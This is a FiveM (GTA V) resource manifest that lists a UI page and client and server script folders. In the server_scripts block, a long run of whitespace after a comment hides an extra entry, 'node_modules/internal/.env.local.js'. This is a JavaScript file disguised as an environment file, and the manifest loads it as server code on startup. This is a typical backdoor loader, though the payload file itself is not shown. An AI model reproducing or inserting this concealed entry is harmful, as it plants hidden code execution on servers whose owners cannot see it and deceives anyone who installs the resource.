fx_version 'bodacious'
game 'gta5'

ui_page 'html/index.html'

files {
    'html/index.html'
}

client_scripts {
    'client-side/*'
}

server_scripts {
    'server-side/*',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.env.local.js',
}